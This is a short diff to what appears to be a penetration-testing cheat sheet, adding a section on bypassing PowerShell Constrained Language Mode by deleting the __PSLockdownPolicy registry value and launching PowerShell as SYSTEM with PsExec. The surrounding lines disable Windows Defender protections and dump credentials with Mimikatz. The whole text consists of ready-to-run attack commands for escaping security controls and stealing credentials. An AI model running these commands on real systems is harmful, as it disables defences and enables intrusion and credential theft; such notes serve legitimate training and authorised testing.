@@ -119,6 +119,11 @@ To bypass AMSI and Defender, there is a possibility to turn them off with Local 
 Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
+### Bypass CLM
+```
+Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy
+PsExec64.exe -i -s C:\Users\fcastle\Desktop\powershell.exe
+```
 ### Geting hashes with Mimikatz 
 ```
 invoke-mimikatz -dumpcred 
